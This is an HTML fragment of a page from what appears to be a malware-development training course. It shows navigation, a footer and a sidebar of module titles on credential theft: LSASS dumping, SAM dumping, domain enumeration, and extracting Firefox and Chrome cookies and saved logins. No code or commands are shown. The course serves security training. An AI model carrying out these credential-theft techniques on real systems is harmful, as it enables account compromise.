                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-74" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./74.html">
                    <div for="module-74" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 74 - LSASS Dump Via Seclogon Race Condition
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-75" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./75.html">
                    <div for="module-75" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 75 - Dumping The SAM Database
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-76" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./76.html">
                    <div for="module-76" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 76 - Dumping The SAM Remotely
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-77" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./77.html">
                    <div for="module-77" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 77 - Dumping The SAM From Disk
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-78" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./78.html">
                    <div for="module-78" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 78 - Domain Enumeration Using MS-SAMR
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-79" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./79.html">
                    <div for="module-79" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 79 - Dumping Browser Cookies: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-80" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./80.html">
                    <div for="module-80" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 80 - Dumping Saved Logins: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-81" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./81.html">
                    <div for="module-81" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 81 - Dumping Browser Cookies: Chrome
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-82" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./82.html">
                    <div for="module-82" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 82 - Dumping Saved Logins: Chrome
                    </div>
                </a>
            </div>
                </div>
    </div>
</div>          </div>
      </div>

      
      <div class="flex">
  <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-r border-l border-gray-600/60 pl-4 pt-2 pb-2 rounded-bl-xl rounded-br-xl shadow-inner">

          <div class="mr-2">
        <a data-target="_self" href="./68.html">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Previous</button>
        </a>
      </div>
    
    <div class="mr-2">
      <a data-target="_self" href="../All Modules.html">
        <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Modules</button>
      </a>
    </div>

    <div class="my-2 mr-2">
      <form id="complete-module" action="./69/complete" method="POST">
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-emerald-600/85 to-emerald-700/85
             hover:from-emerald-500/85 hover:to-emerald-600/85
             border border-emerald-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30 ">Complete</button>
      </form>
      <form id="uncomplete-module" action="./6#" method="POST">
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-rose-600/85 to-rose-700/85
             hover:from-rose-500/85 hover:to-rose-600/85
             border border-rose-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30 hidden">Undo</button>
      </form>
    </div>

          <div class="mr-2">
        <a data-target="_self" href="./70.html">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Next</button>
        </a>
      </div>
    
  </div>
</div>

      
      <input type="hidden" id="objectives-completed" value="20973">

      
      <div id="copyWarning" class="fixed inset-0 hidden z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm">
  <div class="relative bg-gray-800 border border-gray-600 rounded-2xl shadow-2xl p-8 max-w-lg w-11/12 text-center transform transition-all scale-100">
    <p class="text-2xl font-bold text-white mb-4 tracking-wide">
      Reminder
    </p>
    <p class="text-gray-300 text-base mb-6 leading-relaxed">
      To remain compliant with the Terms of Service, avoid copying the entire module and instead copy the necessary sections.
    </p>
    <button onclick="hideCopyWarning()" class="w-full text-white font-medium rounded-lg text-sm px-5 py-2.5 text-center transition-all duration-200 bg-blue-600/80 hover:bg-blue-500/80 border border-blue-400/40 backdrop-blur-sm backdrop-saturate-150">
      I understand
    </button>
    <span class="absolute top-3 right-3 text-gray-400 hover:text-gray-200 cursor-pointer text-xl" onclick="hideCopyWarning()"></span>
  </div>
</div>

      
        </div>

  <footer id="footer" class="text-gray-400
    bg-gradient-to-t from-[#101926] via-[#172130] to-[#1e293b] backdrop-blur-md backdrop-saturate-150 z-20 border-t border-gray-700/50 border-gray-800
     hidden body-font">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4"> 2025 Maldev Academy Inc.</p>
        <a href="https://x.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 1200 1227" xmlns="http://www.w3.org/2000/svg" style="--darkreader-inline-fill: currentColor;" data-darkreader-inline-fill="">
            <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="white" style="--darkreader-inline-fill: var(--darkreader-text-ffffff, #e8e6e3);" data-darkreader-inline-fill=""></path>
          </svg>            
        </a>
        <a href="https://github.com/Maldev-Academy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-6 h-6" fill="white" viewBox="0 0 24 24" aria-hidden="true" style="--darkreader-inline-fill: var(--darkreader-text-ffffff, #e8e6e3);" data-darkreader-inline-fill=""><path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
          Terms of Service
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
  </a></footer></div>
        

        <script src="69_files/jquery-3.6.0.min.js"></script>
        <script src="69_files/bootstrap.min.js"></script>
        <script src="69_files/navbar.js"></script>
        


<link rel="preload" as="style" href="69_files/app-BoiX-DPv.css"><link rel="modulepreload" href="69_files/app-D9jIIQde.js"><link rel="stylesheet" href="69_files/app-BoiX-DPv.css"><style class="darkreader darkreader--sync" media="screen"></style><script type="module" src="69_files/app-D9jIIQde.js"></script><script src="69_files/moduleviewer.js" defer="defer"></script>

    
</body></html>